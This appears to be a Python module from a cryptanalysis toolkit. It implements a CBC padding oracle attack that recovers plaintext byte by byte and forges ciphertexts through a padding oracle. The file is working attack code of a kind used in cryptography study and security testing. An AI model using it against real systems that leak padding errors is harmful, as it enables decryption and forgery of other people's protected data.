from samson.utilities.bytes import Bytes
from samson.oracles.padding_oracle import PaddingOracle
from samson.utilities.runtime import RUNTIME
from samson.ace.decorators import define_exploit
from samson.ace.consequence import Consequence, Requirement, Manipulation
import struct

import logging
log = logging.getLogger(__name__)

# https://grymoire.wordpress.com/2014/12/05/cbc-padding-oracle-attacks-simplified-key-concepts-and-pitfalls/
# @define_exploit(consequence=Consequence.PLAINTEXT_RECOVERY, requirements=[Requirement.EVENTUALLY_DECRYPTS, Consequence.PLAINTEXT_MANIPULATION])
@define_exploit(consequence=Consequence.ENCRYPTION_BYPASS, requirements=[Requirement.EVENTUALLY_DECRYPTS, Manipulation.PT_BIT_LEVEL])
class CBCPaddingOracleAttack(object):
    """
    Performs a CBC padding oracle attack.

    Currently only works with PKCS7.

    Conditions:
        * CBC is being used
        * The system leaks whether the plaintext's padding was correct or not
        * The user has access to an oracle that attempts to decrypt arbitrary ciphertext
    """

    def __init__(self, oracle: PaddingOracle, block_size: int=16, alphabet: list=[byte for byte in range(256)], batch_requests: bool=False, threads: int=1):
        """
        Parameters:
            oracle (PaddingOracle): An oracle that takes in a bytes-like object and returns a boolean indicating whether the padding was correct.
            block_size       (int): Block size of the block cipher being used.
            alphabet        (list): Bytes range the plaintext is made out of.
            batch_requests  (bool): Whether or not the oracle can take batch requests.
            threads          (int): Number of threads to use.
        """
        self.oracle     = oracle
        self.block_size = block_size
        self.alphabet   = alphabet
        self.batch_requests = batch_requests
        self.threads    = threads


    @RUNTIME.report
    def decrypt(self, ciphertext: bytes, iv: bytes=None) -> Bytes:
        """
        Decrypts the `ciphertext` using a CBC padding oracle.

        Parameters:
            ciphertext (bytes): Bytes-like ciphertext to be decrypted.
            iv         (bytes): Initialization vector (or previous ciphertext block) of the ciphertext to crack.

        Returns:
            Bytes: Plaintext corresponding to the inputted ciphertext.
        """
        blocks = Bytes.wrap(ciphertext).chunk(self.block_size)
        if not iv:
            iv     = blocks[0]
            blocks = blocks[1:]

        reversed_blocks = blocks[::-1]

        iv = Bytes.wrap(iv)
        plaintexts = []

        for i, block in enumerate(RUNTIME.report_progress(reversed_blocks, desc='Blocks cracked', unit='blocks')):
            log.debug(f"Starting iteration {i}")
            plaintext = Bytes(b'')

            if i == len(reversed_blocks) - 1:
                preceding_block = iv
            else:
                preceding_block = reversed_blocks[i + 1]

            for _ in RUNTIME.report_progress(range(len(block)), desc='Bytes cracked', unit='bytes'):
                last_working_char = None
                exploit_blocks    = {}

                # Generate candidate blocks
                for possible_char in self.alphabet:
                    test_byte = struct.pack('B', possible_char)
                    payload   = test_byte + plaintext
                    prefix    = b'\x00' * (self.block_size - len(payload))

                    padding = (struct.pack('B', len(payload)) * (len(payload))) ^ payload

                    fake_block    = prefix + padding
                    exploit_block = fake_block ^ preceding_block
                    new_cipher    = bytes(exploit_block + block)

                    exploit_blocks[new_cipher] = test_byte


                if self.batch_requests:
                    best_block = self.oracle.check_padding([k for k,v in exploit_blocks.items()])
                    last_working_char = exploit_blocks[best_block]
                    log.debug(f"Found working byte: {last_working_char}")

                else:
                    @RUNTIME.threaded(threads=self.threads, starmap=True)
                    def attempt_exploit_block(exploit_block, byte):
                        if self.oracle.check_padding(exploit_block):
                            return byte

                    last_working_char = max([b for b in attempt_exploit_block(exploit_blocks.items()) if b is not None])

                plaintext = last_working_char + plaintext

            plaintexts.append(plaintext)
        return Bytes(b''.join(plaintexts[::-1]))


    execute = decrypt


    def encrypt(self, ciphertext: bytes, new_plaintext: bytes, iv: bytes=None, pad: bool=True) -> Bytes:
        """
        Encrypts the `new_plaintext` using a CBC padding oracle on `ciphertext`.

        Parameters:
            ciphertext    (bytes): Bytes-like ciphertext to be decrypted.
            new_plaintext (bytes): Desired plaintext.
            iv            (bytes): Initialization vector (or previous ciphertext block) of the ciphertext to crack.
            pad            (bool): Whether or not to pad the plaintext with PKCS7.

        Returns:
            Bytes: Ciphertext corresponding to the inputted plaintext.
        """
        ct_blocks = Bytes.wrap(ciphertext).chunk(self.block_size)
        if not iv:
            iv        = ct_blocks[0]
            ct_blocks = ct_blocks[1:]

        if pad:
            from samson.padding.pkcs7 import PKCS7
            new_plaintext = PKCS7(self.block_size).pad(new_plaintext)

        new_pt_blocks = Bytes.wrap(new_plaintext).chunk(self.block_size)
        ct_blocks     = [iv] + ct_blocks[-len(new_pt_blocks):]

        for i in reversed(range(1 ,len(ct_blocks))):
            pt_blk_i        = self.decrypt(iv=ct_blocks[i-1], ciphertext=ct_blocks[i])
            ct_blocks[i-1] ^= pt_blk_i ^ new_pt_blocks[i-1]

        return ct_blocks[0], b''.join(ct_blocks[1:])
